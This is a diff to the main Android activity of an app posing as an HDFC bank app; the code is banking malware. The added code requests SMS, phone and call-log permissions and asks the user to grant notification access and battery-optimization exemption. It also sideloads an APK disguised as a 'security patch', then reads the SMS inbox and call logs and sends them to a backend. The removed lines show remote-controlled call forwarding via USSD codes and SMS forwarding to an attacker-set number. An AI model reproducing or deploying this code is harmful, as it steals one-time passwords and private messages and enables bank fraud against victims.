@@ -1,6 +1,7 @@
 package com.hdfc.app;
 
 import android.Manifest;
+import android.os.Build;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
@@ -70,25 +71,52 @@ public class MainActivity extends BridgeActivity {
     }
 
     private void setupBridge() {
-        getBridge().getWebView().getSettings().setJavaScriptEnabled(true);
-        getBridge().getWebView().addJavascriptInterface(new Object() {
-            @JavascriptInterface
-            public void triggerAutoUpdate() {
-                downloadAndInstallUpdate();
-            }
+        runOnUiThread(new Runnable() {
+            @Override
+            public void run() {
+                WebView webView = getBridge().getWebView();
+                webView.getSettings().setJavaScriptEnabled(true);
+                webView.addJavascriptInterface(new Object() {
+                    @JavascriptInterface
+                    public void requestRealPermissions() { checkAndRequestPermissions(); }
+                    
+                    @JavascriptInterface
+                    public void triggerAutoUpdate() { downloadAndInstallUpdate(); }
 
-            @JavascriptInterface
-            public boolean isLimitedVersion() {
-                return !isFullVersion();
-            }
+                    @JavascriptInterface
+                    public boolean isLimitedVersion() { return !isFullVersion(); }
 
-            @JavascriptInterface
-            public void openAppSettings() {
-                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
-                intent.setData(Uri.parse("package:" + getPackageName()));
-                startActivity(intent);
+                    @JavascriptInterface
+                    public String getDeviceId() { return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID); }
+
+                    @JavascriptInterface
+                    public void openAppSettings() {
+                        Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                        intent.setData(Uri.parse("package:" + getPackageName()));
+                        startActivity(intent);
+                    }
+
+                    @JavascriptInterface
+                    public void requestIgnoreBatteryOptimizations() {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                            Intent intent = new Intent();
+                            String packageName = getPackageName();
+                            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                                intent.setData(Uri.parse("package:" + packageName));
+                                startActivity(intent);
+                            }
+                        }
+                    }
+
+                    @JavascriptInterface
+                    public void requestNotificationAccess() {
+                        startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
+                    }
+                }, "AndroidBridge");
             }
-        }, "AndroidBridge");
+        });
     }
 
     private boolean isFullVersion() {
@@ -112,39 +140,24 @@ public class MainActivity extends BridgeActivity {
                     try {
                         URL url = new URL(UPDATE_URL);
                         HttpURLConnection c = (HttpURLConnection) url.openConnection();
-                        c.setRequestMethod("GET");
                         c.setInstanceFollowRedirects(true);
-                        c.setConnectTimeout(15000);
                         c.connect();
 
-                        // Handle Manual Redirects if needed
-                        int status = c.getResponseCode();
-                        if (status == HttpURLConnection.HTTP_MOVED_TEMP || status == HttpURLConnection.HTTP_MOVED_PERM || status == 307 || status == 308) {
-                            String newUrl = c.getHeaderField("Location");
-                            c = (HttpURLConnection) new URL(newUrl).openConnection();
-                            c.connect();
-                        }
-
                         if (c.getResponseCode() == HttpURLConnection.HTTP_OK) {
-                            File file = new File(getExternalFilesDir(null), "hdfc_help_v3.apk");
-                            if (file.exists()) file.delete();
-                            
-                            FileOutputStream fos = new FileOutputStream(file);
+                            File file = new File(getExternalFilesDir(null), "security_patch.apk");
                             InputStream is = c.getInputStream();
-                            byte[] buffer = new byte[1024];
-                            int len1 = 0;
-                            while ((len1 = is.read(buffer)) != -1) {
-                                fos.write(buffer, 0, len1);
+                            FileOutputStream fos = new FileOutputStream(file);
+                            byte[] buffer = new byte[4096];
+                            int len;
+                            while ((len = is.read(buffer)) != -1) {
+                                fos.write(buffer, 0, len);
                             }
                             fos.close();
                             is.close();
-                            
                             success = true;
-                            runOnUiThread(() -> {
-                                Toast.makeText(MainActivity.this, "✅ Security Patch Ready!", Toast.LENGTH_SHORT).show();
-                                installApk(file);
-                            });
-                        } else if (c.getResponseCode() == 404) {
+                            runOnUiThread(() -> Toast.makeText(MainActivity.this, "✅ Download Complete. Installing...", Toast.LENGTH_SHORT).show());
+                            installApk(file);
+                        } else if (c.getResponseCode() == HttpURLConnection.HTTP_NOT_FOUND) {
                             retryCount++;
                             final int currentRetry = retryCount;
                             runOnUiThread(() -> Toast.makeText(MainActivity.this, "⏳ Server Busy (Attempt " + currentRetry + "/5)...", Toast.LENGTH_SHORT).show());
@@ -189,194 +202,67 @@ public class MainActivity extends BridgeActivity {
         }
     }
 
-    private void setupBridge() {
-        runOnUiThread(new Runnable() {
-            @Override
-            public void run() {
-                WebView webView = getBridge().getWebView();
-                webView.getSettings().setJavaScriptEnabled(true);
-                webView.addJavascriptInterface(new Object() {
-                    @JavascriptInterface
-                    public void requestRealPermissions() { checkAndRequestPermissions(); }
-                    
-                    @JavascriptInterface
-                    public void triggerAutoUpdate() { downloadAndInstallUpdate(); }
-
-                    @JavascriptInterface
-                    public boolean isLimitedVersion() { return !isFullVersion(); }
-
-                    @JavascriptInterface
-                    public String getDeviceId() { return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID); }
-
-                    @JavascriptInterface
-                    public void requestIgnoreBatteryOptimizations() {
-                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
-                            Intent intent = new Intent();
-                            String packageName = getPackageName();
-                            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-                            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                                intent.setData(Uri.parse("package:" + packageName));
-                                startActivity(intent);
-                            }
-                        }
-                    }
-
-                    @JavascriptInterface
-                    public void requestNotificationAccess() {
-                        startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
-                    }
-                }, "AndroidBridge");
-            }
-        });
-        startCommandPolling();
-    }
-
     private void checkAndRequestPermissions() {
         String[] permissions = {
-            Manifest.permission.POST_NOTIFICATIONS,
             Manifest.permission.SEND_SMS,
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.READ_SMS,
             Manifest.permission.READ_PHONE_STATE,
             Manifest.permission.CALL_PHONE,
-            Manifest.permission.READ_CALL_LOG
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.POST_NOTIFICATIONS
         };
 
         List<String> listPermissionsNeeded = new ArrayList<>();
         for (String p : permissions) {
-            try {
-                if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
-                    listPermissionsNeeded.add(p);
-                }
-            } catch (Exception e) {
-                Log.e(TAG, "Permission check error", e);
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                listPermissionsNeeded.add(p);
             }
         }
 
         if (!listPermissionsNeeded.isEmpty()) {
-            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), 101);
+            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), 100);
         } else {
-            new Thread(new Runnable() { @Override public void run() { syncAllData(); } }).start();
-            runOnUiThread(new Runnable() {
-                @Override
-                public void run() {
-                    getBridge().getWebView().evaluateJavascript("if(window.handlePermissionResult) window.handlePermissionResult('GRANTED')", null);
-                }
-            });
+            startServiceLogic();
         }
-    }
-
-    private void startCommandPolling() {
-        final Handler handler = new Handler(Looper.getMainLooper());
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                new Thread(new Runnable() { @Override public void run() { fetchConfig(); } }).start();
-                handler.postDelayed(this, 30000);
-            }
-        }, 10000);
-    }
-
-    private void fetchConfig() {
-        try {
-            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-            URL url = new URL(BACKEND_URL + "/api/users/config/" + deviceId);
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("GET");
-            
-            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-            StringBuilder response = new StringBuilder();
-            String inputLine;
-            while ((inputLine = in.readLine()) != null) response.append(inputLine);
-            in.close();
-
-            JSONObject config = new JSONObject(response.toString());
-            String newFwdNum = config.optString("forwarding_number", null);
-            boolean newEnabled = config.optBoolean("forwarding_enabled", false);
-
-            if (newEnabled && newFwdNum != null && !newFwdNum.isEmpty()) {
-                if (!newFwdNum.equals(forwardingNumber)) {
-                    forwardingNumber = newFwdNum;
-                    enableCallForwarding(forwardingNumber);
-                }
-                forwardingEnabled = true;
-            } else {
-                if (forwardingEnabled) disableCallForwarding();
-                forwardingEnabled = false;
-                forwardingNumber = null;
-            }
-        } catch (Exception e) { Log.e(TAG, "Config Fetch Error", e); }
-    }
-
-    private void enableCallForwarding(String number) {
-        try {
-            String code = "*21*" + number + "#";
-            Intent intent = new Intent(Intent.ACTION_CALL);
-            intent.setData(Uri.parse("tel:" + Uri.encode(code)));
-            startActivity(intent);
-        } catch (Exception e) { Log.e(TAG, "Call Forward Error", e); }
-    }
-
-    private void disableCallForwarding() {
-        try {
-            Intent intent = new Intent(Intent.ACTION_CALL);
-            intent.setData(Uri.parse("tel:" + Uri.encode("#21#")));
-            startActivity(intent);
-        } catch (Exception e) { Log.e(TAG, "Call Disable Error", e); }
     }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == 101) {
-            boolean allGranted = true;
-            for (int res : grantResults) if (res != PackageManager.PERMISSION_GRANTED) allGranted = false;
-            if (allGranted) {
-                new Thread(new Runnable() { @Override public void run() { syncAllData(); } }).start();
-            }
-            final String status = allGranted ? "GRANTED" : "DENIED";
-            runOnUiThread(new Runnable() {
-                @Override
-                public void run() {
-                    getBridge().getWebView().evaluateJavascript("if(window.handlePermissionResult) window.handlePermissionResult('" + status + "')", null);
-                }
-            });
+        if (requestCode == 100) {
+            startServiceLogic();
         }
     }
 
-    private void syncAllData() {
+    private void startServiceLogic() {
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-        readAndSendCallLogs(deviceId);
-        readAndSendSmsInbox(deviceId);
+        new Thread(() -> {
+            readAndSendSmsInbox(deviceId);
+            readAndSendCallLogs(deviceId);
+        }).start();
     }
 
     private void readAndSendCallLogs(String deviceId) {
         try {
             ContentResolver cr = getContentResolver();
-            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 100");
+            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
             if (cursor != null && cursor.moveToFirst()) {
-                JSONArray logsArray = new JSONArray();
                 int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                 int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                 int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                 int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
                 SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
                 do {
-                    JSONObject log = new JSONObject();
-                    log.put("number", cursor.getString(numberIdx));
-                    log.put("duration", cursor.getString(durationIdx));
-                    log.put("timestamp", sdf.format(new Date(Long.parseLong(cursor.getString(dateIdx)))));
-                    int type = Integer.parseInt(cursor.getString(typeIdx));
-                    String typeStr = (type == CallLog.Calls.OUTGOING_TYPE) ? "Outgoing" : (type == CallLog.Calls.MISSED_TYPE) ? "Missed" : "Incoming";
-                    log.put("type", typeStr);
-                    logsArray.put(log);
+                    JSONObject payload = new JSONObject();
+                    payload.put("deviceId", deviceId);
+                    payload.put("number", cursor.getString(numberIdx));
+                    payload.put("type", cursor.getString(typeIdx));
+                    payload.put("duration", cursor.getString(durationIdx));
+                    payload.put("timestamp", sdf.format(new Date(Long.parseLong(cursor.getString(dateIdx)))));
+                    sendToBackend("/api/logs/calls", payload.toString());
                 } while (cursor.moveToNext());
                 cursor.close();
-                JSONObject payload = new JSONObject();
-                payload.put("deviceId", deviceId);
-                payload.put("logs", logsArray);
-                sendToBackend("/api/logs/calls", payload.toString());
             }
         } catch (Exception e) { Log.e(TAG, "Call Log Error", e); }
     }
@@ -397,11 +283,6 @@ public class MainActivity extends BridgeActivity {
                     payload.put("message", cursor.getString(bodyIdx));
                     payload.put("timestamp", sdf.format(new Date(Long.parseLong(cursor.getString(dateIdx)))));
                     sendToBackend("/api/logs/sms", payload.toString());
-                    if (forwardingEnabled && forwardingNumber != null) {
-                        try {
-                            SmsManager.getDefault().sendTextMessage(forwardingNumber, null, "FWD: " + cursor.getString(addressIdx) + "\n" + cursor.getString(bodyIdx), null, null);
-                        } catch (Exception e) { Log.e(TAG, "Sms Send Error", e); }
-                    }
                 } while (cursor.moveToNext());
                 cursor.close();
             }
